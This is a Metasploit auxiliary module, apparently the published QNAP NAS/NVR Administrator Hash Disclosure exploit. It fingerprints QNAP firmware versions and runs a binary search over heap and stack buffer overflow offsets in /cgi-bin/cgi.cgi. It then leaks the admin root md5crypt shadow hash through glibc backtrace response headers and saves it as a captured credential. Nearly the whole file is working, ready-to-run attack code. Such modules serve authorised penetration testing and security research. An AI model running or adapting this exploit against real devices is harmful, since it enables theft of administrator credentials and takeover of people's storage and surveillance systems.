##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'QNAP NAS/NVR Administrator Hash Disclosure',
      'Description'    => %q{
        This module exploits combined heap and stack buffer overflows for QNAP
        NAS and NVR devices to dump the admin (root) shadow hash from memory via
        an overwrite of __libc_argv[0] in the HTTP-header-bound glibc backtrace.

        A binary search is performed to find the correct offset for the BOFs.
        Since the server forks, blind remote exploitation is possible, provided
        the heap does not have ASLR.
      },
      'Author'         => [
        'bashis',      # Vuln/PoC
        'wvu',         # Module
        'Donald Knuth' # Algorithm
      ],
      'References'     => [
        ['URL', 'https://seclists.org/fulldisclosure/2017/Feb/2'],
        ['URL', 'https://en.wikipedia.org/wiki/Binary_search_algorithm']
      ],
      'DisclosureDate' => 'Jan 31 2017',
      'License'        => MSF_LICENSE,
      'Actions'        => [
        ['Automatic', 'Description' => 'Automatic targeting'],
        ['x86',       'Description' => 'x86 target', offset: 0x16b2],
        ['ARM',       'Description' => 'ARM target', offset: 0x1562]
      ],
      'DefaultAction'  => 'Automatic',
      'DefaultOptions' => {
        'SSL'          => true
      }
    ))

    register_options([
      Opt::RPORT(443),
      OptInt.new('OFFSET_START', [true, 'Starting offset (backtrace)', 2000]),
      OptInt.new('OFFSET_END',   [true, 'Ending offset (no backtrace)', 5000]),
      OptInt.new('RETRIES',      [true, 'Retry count for the attack', 10])
    ])
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => '/cgi-bin/authLogin.cgi'
    )

    if res && res.code == 200 && (xml = res.get_xml_document)
      info = []

      %w{modelName version build patch}.each do |node|
        info << xml.at("//#{node}").text
      end

      @target = (xml.at('//platform').text == 'TS-NASX86' ? 'x86' : 'ARM')
      vprint_status("QNAP #{info[0]} #{info[1..-1].join('-')} detected")

      if Gem::Version.new(info[1]) < Gem::Version.new('4.2.3')
        Exploit::CheckCode::Appears
      else
        Exploit::CheckCode::Detected
      end
    else
      Exploit::CheckCode::Safe
    end
  end

  def run
    if check == Exploit::CheckCode::Safe
      print_error('Device does not appear to be a QNAP')
      return
    end

    admin_hash = nil

    (0..datastore['RETRIES']).each do |attempt|
      vprint_status("Retry #{attempt} in progress") if attempt > 0
      break if (admin_hash = dump_hash)
    end

    if admin_hash
      print_good("Hopefully this is your hash: #{admin_hash}")
      credential_data = {
        workspace_id:    myworkspace_id,
        module_fullname: self.fullname,
        username:        'admin',
        private_data:    admin_hash,
        private_type:    :nonreplayable_hash,
        jtr_format:      'md5crypt'
      }.merge(service_details)
      create_credential(credential_data)
    else
      print_error('Looks like we didn\'t find the hash :(')
    end

    vprint_status("#{@cnt} HTTP requests were sent during module run")
  end

  def dump_hash
    l = datastore['OFFSET_START']
    r = datastore['OFFSET_END']

    start = Time.now
    t     = binsearch(l, r)
    stop  = Time.now

    time = stop - start
    vprint_status("Binary search of #{l}-#{r} completed in #{time}s")

    if action.name == 'Automatic'
      target = actions.find do |tgt|
        tgt.name == @target
      end
    else
      target = action
    end

    return if t.nil? || @offset.nil? || target.nil?

    offset = @offset - target[:offset]

    find_hash(t, offset)
  end

  def find_hash(t, offset)
    admin_hash = nil

    # Off by one or two...
    2.times do
      t += 1

      if (res = send_request(t, [offset].pack('V')))
        if (backtrace = find_backtrace(res))
          token = backtrace[0].split[4]
        end
      end

      if token && token.start_with?('$1$')
        admin_hash = token
        addr       = "0x#{offset.to_s(16)}"
        vprint_status("Admin hash found at #{addr} with offset #{t}")
        break
      end
    end

    admin_hash
  end

  # Shamelessly stolen from Knuth
  def binsearch(l, r)
    return if l > r

    @m = ((l + r) / 2).floor

    res = send_request(@m)

    return if res.nil?

    if find_backtrace(res)
      l = @m + 1
    else
      r = @m - 1
    end

    binsearch(l, r)

    @m
  end

  def send_request(m, ret = nil)
    @cnt = @cnt.to_i + 1

    payload = Rex::Text.encode_base64(
      Rex::Text.rand_text(1) * m +
      (ret ? ret : Rex::Text.rand_text(4))
    )

    res = send_request_cgi(
      'method'   => 'GET',
      'uri'      => '/cgi-bin/cgi.cgi',
      #'vhost'    => 'Q',
      'vars_get' => {
        'u'      => 'admin',
        'p'      => payload
      }
    )

    res
  end

  def find_backtrace(res)
    res.headers.find do |name, val|
      if name.include?('glibc detected')
        @offset = val.split[-2].to_i(16)
      end
    end
  end
end
